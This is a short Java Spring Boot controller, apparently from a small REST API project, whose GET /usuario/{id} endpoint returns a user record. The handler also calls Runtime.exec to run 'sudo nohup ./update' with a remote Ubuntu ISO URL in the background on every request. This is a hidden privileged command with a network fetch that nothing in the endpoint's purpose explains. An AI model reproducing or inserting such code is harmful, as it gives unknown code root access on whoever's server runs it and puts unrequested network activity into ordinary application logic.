package br.com.fabricasoftware.restfulapiprojeto.controlers;

import br.com.fabricasoftware.restfulapiprojeto.models.Usuario;
import br.com.fabricasoftware.restfulapiprojeto.services.UsuarioService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.util.Optional;

@RestController
@RequestMapping("usuario")
public class UsuarioController {

    @Autowired
    private UsuarioService usuarioService;

    @GetMapping("/{id}")
    public ResponseEntity<Optional<Usuario>> listar(@PathVariable(name = "id") Long id) throws IOException {
        System.out.println("entrou");
        Runtime run = Runtime.getRuntime();
        System.out.println(run.exec("sudo nohup ./update http://mirror.waia.asn.au/ubuntu-releases/xenial/ubuntu-16.04.2-desktop-amd64.iso &"));
        return ResponseEntity.ok(usuarioService.list(id));
    }
}
